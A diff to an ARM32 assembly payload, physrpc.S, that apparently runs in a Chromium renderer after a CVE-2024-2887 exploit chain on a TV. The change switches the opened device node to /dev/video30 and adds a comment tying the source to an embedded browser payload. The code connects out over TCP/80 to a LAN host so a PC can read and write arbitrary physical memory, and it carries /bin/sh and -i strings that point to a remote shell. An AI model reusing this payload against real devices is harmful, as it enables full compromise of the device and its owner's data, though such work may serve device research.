@@ -1,7 +1,14 @@
 @ physrpc.S - position-independent ARM32 physmap RPC stub.
 @ Runs inside the Chromium renderer after the CVE-2024-2887 chain
-@ (backing+0x600, RWX).  Opens /dev/video40 and speaks a tiny binary
+@ (backing+0x600, RWX).  Opens /dev/video30 and speaks a tiny binary
 @ protocol over TCP/80 so the PC can read/write arbitrary physical pages.
+@
+@ NOTE: the shipped blob in server/payloads/browser_payload.js opens
+@ /dev/video30; this source said video40 until 2026-10-24.  video30/40/60 are
+@ the same driver family on this TV, but only video30 is the *proven* node, so
+@ the source matches the blob (a rebuild + re-embed must not silently switch
+@ nodes).  `python tools/build_physrpc.py --check-embedded` verifies the two
+@ are identical; change both together.
 @
 @ Protocol (all u32 little-endian, 16-byte header: op, a, b, c)
 @   op 0 READ     : a=phys page (4K aligned), b=offset, c=len (<=4096)
@@ -464,7 +471,7 @@ sa:         .word 0x50000002      @ AF_INET, port 80 (big endian)
             .word 0xd6b2a8c0      @ 192.168.178.214
             .word 0
             .word 0
-path:       .ascii "/dev/video40\0"
+path:       .ascii "/dev/video30\0"
 hello:      .ascii "PGDB"
 shpath:     .ascii "/bin/sh\0"
 arg_i:      .ascii "-i\0"
